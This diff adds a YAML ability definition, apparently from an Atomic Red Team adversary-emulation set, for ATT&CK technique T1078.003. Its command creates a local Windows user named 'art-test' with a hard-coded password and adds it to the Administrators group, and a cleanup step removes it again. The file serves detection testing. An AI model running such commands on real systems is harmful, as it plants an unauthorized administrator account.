@@ -1,0 +1,35 @@
+- id: a524ce99-86de-4db6-b4f9-e08f35a47a15
+  name: Create local account with admin privileges
+  description: After execution the new account will be active and added to the Administrators
+    group
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1078.003
+    name: 'Valid Accounts: Local Accounts'
+  platforms:
+    windows:
+      sh:
+        command: net user art-test /add; net user art-test -4RTisCool!-321; net localgroup
+          administrators art-test /add
+        cleanup: net localgroup administrators art-test /delete >nul 2>&1; net user
+          art-test /delete >nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - atomic-red-team
+  - t1078.003
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      password:
+        description: Password for art-test user
+        type: string
+        default: -4RTisCool!-321
+    technique_created: '2020-03-13T20:26:46.695Z'
+    atomic_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
+    import_timestamp: '2025-06-24T11:15:02.850918Z'
